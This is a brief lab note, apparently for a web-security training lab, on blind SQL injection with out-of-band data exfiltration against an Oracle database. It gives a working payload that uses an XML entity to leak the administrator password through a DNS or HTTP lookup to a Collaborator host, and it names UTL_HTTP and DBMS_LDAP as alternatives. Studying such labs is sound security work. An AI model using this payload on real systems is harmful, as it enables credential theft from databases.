# Lab: Blind SQL injection with out-of-band data exfiltration (Practitioner)

**Goal:** Exfiltrate the administrator password via out-of-band channel (DNS/HTTP to Collaborator).

## Technique

Embed the data into a DNS lookup or HTTP request to your Collaborator server.

## Typical Oracle Payload

```
' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l')='a
```

Or using UTL_HTTP / DBMS_LDAP etc.

The password will appear in the Collaborator interactions as a subdomain or in the request.

## Notes

Requires Burp Suite Professional with Collaborator client.
